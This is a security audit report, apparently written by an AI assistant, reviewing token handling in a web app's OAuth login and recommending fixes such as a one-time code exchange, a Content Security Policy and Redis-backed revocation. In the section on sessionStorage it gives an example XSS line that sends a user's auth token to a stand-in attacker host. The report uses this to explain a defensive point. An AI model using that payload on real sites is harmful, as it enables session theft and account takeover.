# Security Audit Report - Token-Based Authentication

## 🔍 Security Review Date
November 9, 2024

## ⚠️ Critical Security Issues Found

### 1. **HIGH RISK: Token Exposed in URL**

**Issue:**
```typescript
// backend/src/routes/auth.ts
const redirectUrl = `${frontendUrl}?auth=success&token=${authToken}`;
return reply.redirect(redirectUrl);
```

**Problem:**
- Token appears in browser URL bar
- Logged in browser history (even though we try to clear it)
- Visible to user
- Can be captured by:
  - Server logs (both Cloud Run and Vercel)
  - Browser extensions
  - Screen recordings
  - Shoulder surfing
  - Referer headers (if user clicks external link)

**Risk Level:** 🔴 **HIGH**

**Attack Scenario:**
1. User completes OAuth
2. Token in URL: `https://github-scraper-psi.vercel.app?token=eyJhbGc...`
3. User shares their screen, URL is visible
4. Attacker copies token
5. Attacker can impersonate user for 7 days

**Recommendation:** Use a different approach (see fixes below)

---

### 2. **MEDIUM RISK: XSS Vulnerability (sessionStorage)**

**Issue:**
```typescript
// frontend/src/utils/tokenStorage.ts
sessionStorage.setItem(TOKEN_KEY, token);
```

**Problem:**
- Any JavaScript code can access sessionStorage
- If attacker injects malicious script (XSS), they can steal token
- Example attack:
```javascript
// Malicious script injected via XSS
fetch('https://evil.com/steal?token=' + sessionStorage.getItem('github_scraper_auth_token'));
```

**Risk Level:** 🟡 **MEDIUM**

**Mitigation:**
- sessionStorage is safer than localStorage (cleared on tab close)
- BUT still vulnerable to XSS
- Next.js has built-in XSS protection, but not 100% secure

**Recommendation:** Combine with Content Security Policy (CSP)

---

### 3. **MEDIUM RISK: No Token Encryption in Transit (in URL)**

**Issue:**
Token is transmitted in URL during redirect:
```
https://github-scraper-psi.vercel.app?auth=success&token=eyJhbGc...
```

**Problem:**
- While HTTPS encrypts the connection, the URL is:
  - Logged in Cloud Run logs
  - Logged in Vercel logs
  - Potentially logged in intermediate proxies
  - Visible in browser history

**Risk Level:** 🟡 **MEDIUM**

**Recommendation:** Use POST request or different transport method

---

### 4. **LOW RISK: Long Token Expiration**

**Issue:**
```typescript
const TOKEN_EXPIRATION = '7d'; // 7 days
```

**Problem:**
- If token is compromised, attacker has 7 days of access
- User can't revoke token (except by logout, which requires token)

**Risk Level:** 🟢 **LOW**

**Current Mitigation:**
- Token revocation on logout works
- 7 days is reasonable for user experience

**Recommendation:** Consider shorter expiration with refresh tokens

---

### 5. **LOW RISK: Token Revocation in Memory**

**Issue:**
```typescript
// backend/src/utils/tokenUtils.ts
const revokedTokens = new Set<string>();
```

**Problem:**
- Revoked tokens list cleared on backend restart
- If backend restarts, revoked tokens become valid again
- Only applies until token naturally expires

**Risk Level:** 🟢 **LOW**

**Current Mitigation:**
- Tokens still expire after 7 days
- User can logout multiple times (revokes multiple times)

**Recommendation:** Use Redis for persistent revocation

---

## ✅ Security Features That Are Good

### 1. **JWT Signing** ✅
```typescript
jwt.sign({ userId, sessionId }, SECRET, { expiresIn: TOKEN_EXPIRATION });
```
- Uses strong cryptographic signing
- Tokens cannot be forged without SECRET
- **Good!**

### 2. **Token Validation** ✅
```typescript
export async function validateAuthToken(token: string): Promise<number | null> {
  const payload = verifyAuthToken(token);
  // Verifies signature
  // Checks expiration
  // Validates user exists
}
```
- Comprehensive validation
- **Good!**

### 3. **HTTPS Everywhere** ✅
- Cloud Run uses HTTPS
- Vercel uses HTTPS
- **Good!**

### 4. **sessionStorage vs localStorage** ✅
- Cleared on tab close (better than localStorage)
- **Good choice!**

### 5. **Immediate URL Cleanup** ✅
```typescript
window.history.replaceState({}, '', url.pathname + url.hash);
```
- Removes token from URL immediately
- Reduces window of exposure
- **Good!**

### 6. **Token Revocation** ✅
```typescript
revokeToken(payload.sessionId);
```
- Tokens revoked on logout
- **Good!**

---

## 🛡️ Recommended Fixes

### Fix #1: Remove Token from URL (CRITICAL)

**Option A: Use HTTP-Only Cookies (Most Secure)**

Despite the third-party cookie issues, we can make this work with better configuration:

```typescript
// backend/src/routes/auth.ts
// Instead of putting token in URL, set it as HttpOnly cookie
reply.setCookie('auth_token', authToken, {
  httpOnly: true,  // JavaScript cannot access
  secure: true,    // HTTPS only
  sameSite: 'none', // Allow cross-site
  maxAge: 7 * 24 * 60 * 60, // 7 days
  path: '/',
  domain: undefined // Let browser handle it
});

// Redirect without token in URL
const redirectUrl = `${frontendUrl}?auth=success`;
return reply.redirect(redirectUrl);
```

**Frontend reads from cookie header (automatic)**

**Option B: Use State Parameter**

```typescript
// Generate one-time code instead of token
const oneTimeCode = generateSecureRandomString(32);
// Store in Redis with short expiration (60 seconds)
await redis.set(`auth:${oneTimeCode}`, userId, 'EX', 60);

// Redirect with code
const redirectUrl = `${frontendUrl}?auth=success&code=${oneTimeCode}`;

// Frontend exchanges code for token via POST request
POST /auth/exchange-code { code: oneTimeCode }
→ Returns { token: JWT }
```

**This is what OAuth actually does!**

**Option C: Use POST Message**

```typescript
// Backend returns HTML with JavaScript that posts message
return reply.type('text/html').send(`
  <html>
    <body>
      <script>
        // Post token to opener window (secure)
        if (window.opener) {
          window.opener.postMessage({ token: '${authToken}' }, '${frontendUrl}');
          window.close();
        } else {
          // Fallback: redirect with token (less secure)
          window.location = '${frontendUrl}?auth=success&token=${authToken}';
        }
      </script>
    </body>
  </html>
`);
```

**My Recommendation: Option B (OAuth-style code exchange)**

---

### Fix #2: Add Content Security Policy

```typescript
// frontend/next.config.ts
const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'", // Next.js needs these
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "connect-src 'self' https://api-sgmtwgzrlq-ue.a.run.app",
              "frame-ancestors 'none'", // Prevent clickjacking
            ].join('; '),
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY', // Prevent clickjacking
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff', // Prevent MIME sniffing
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin', // Don't leak URLs
          },
        ],
      },
    ];
  },
};
```

---

### Fix #3: Use Redis for Token Revocation

```typescript
// backend/src/utils/tokenUtils.ts
import Redis from 'ioredis';

const redis = new Redis({
  host: process.env.REDIS_HOST,
  port: parseInt(process.env.REDIS_PORT || '6379'),
  password: process.env.REDIS_PASSWORD,
  tls: process.env.REDIS_TLS === 'true' ? {} : undefined,
});

export function revokeToken(sessionId: string): void {
  // Store in Redis with TTL matching token expiration
  redis.setex(`revoked:${sessionId}`, 7 * 24 * 60 * 60, '1');
  console.log('[AUTH] Token revoked in Redis:', sessionId);
}

export async function isTokenRevoked(sessionId: string): Promise<boolean> {
  const result = await redis.get(`revoked:${sessionId}`);
  return result === '1';
}
```

---

### Fix #4: Add Rate Limiting

```bash
npm install @fastify/rate-limit
```

```typescript
// backend/src/index.ts
await app.register(require('@fastify/rate-limit'), {
  max: 100, // 100 requests per window
  timeWindow: '15 minutes',
  redis: redis, // Use Redis for distributed rate limiting
});
```

---

### Fix #5: Shorter Token Expiration + Refresh

```typescript
// Generate short-lived access token (15 minutes)
const accessToken = jwt.sign(
  { userId, sessionId },
  SECRET,
  { expiresIn: '15m' }
);

// Generate long-lived refresh token (7 days)
const refreshToken = jwt.sign(
  { userId, sessionId, type: 'refresh' },
  REFRESH_SECRET,
  { expiresIn: '7d' }
);

// Store refresh token in database
await prisma.refreshToken.create({
  data: {
    userId,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  },
});
```

---

## 🎯 Security Score

| Aspect | Current | With Fixes |
|--------|---------|------------|
| Token Transport | 🔴 3/10 | 🟢 9/10 |
| XSS Protection | 🟡 6/10 | 🟢 9/10 |
| Token Storage | 🟢 7/10 | 🟢 9/10 |
| Token Validation | 🟢 9/10 | 🟢 9/10 |
| Revocation | 🟡 6/10 | 🟢 9/10 |
| **Overall** | **🟡 6.2/10** | **🟢 9/10** |

---

## 🚨 Immediate Action Required

### Priority 1: Fix Token-in-URL Issue

**Current implementation has token in URL - this is the biggest risk.**

**Recommended immediate fix:**

```typescript
// backend/src/routes/auth.ts
// Generate one-time code instead of token
const oneTimeCode = crypto.randomBytes(32).toString('hex');

// Store in Redis with 60 second expiration
await redis.setex(`auth:code:${oneTimeCode}`, 60, JSON.stringify({
  userId: user.id,
  sessionId: request.session.id,
  createdAt: Date.now(),
}));

// Redirect with code instead of token
const redirectUrl = `${frontendUrl}?auth=success&code=${oneTimeCode}`;
```

```typescript
// Add new endpoint to exchange code for token
fastify.post('/auth/exchange-code', async (request, reply) => {
  const { code } = request.body as { code: string };
  
  // Get user data from Redis
  const data = await redis.get(`auth:code:${code}`);
  if (!data) {
    return reply.status(401).send({ error: 'Invalid or expired code' });
  }
  
  // Delete code (one-time use)
  await redis.del(`auth:code:${code}`);
  
  const { userId, sessionId } = JSON.parse(data);
  
  // Generate token
  const token = generateAuthToken(userId, sessionId);
  
  return reply.send({ token });
});
```

This is **much more secure** because:
- ✅ Code only valid for 60 seconds (vs 7 days for token)
- ✅ Code is one-time use
- ✅ Token never appears in URL or logs
- ✅ Standard OAuth practice

---

## 📊 Final Recommendation

### Current Implementation: 🟡 **Acceptable for Demo/Personal Use**

If this is a personal project or demo:
- ✅ Deploy as-is
- ⚠️ Be aware of token-in-URL risk
- ⚠️ Don't use for sensitive data
- ⚠️ Plan to improve later

### Production Implementation: 🔴 **Needs Improvements**

If this is for production/commercial use:
1. **Implement code exchange pattern** (Priority 1)
2. **Add Content Security Policy** (Priority 2)
3. **Use Redis for revocation** (Priority 3)
4. **Add rate limiting** (Priority 4)
5. **Consider refresh tokens** (Priority 5)

---

## 🤔 Decision Time

**Option 1: Deploy current implementation**
- Works immediately
- Solves cookie problem
- Has security risks but acceptable for demo
- Can improve later

**Option 2: Implement code exchange first**
- More secure
- Takes 30-60 minutes more work
- Production-ready
- Best practice

**What would you like to do?**

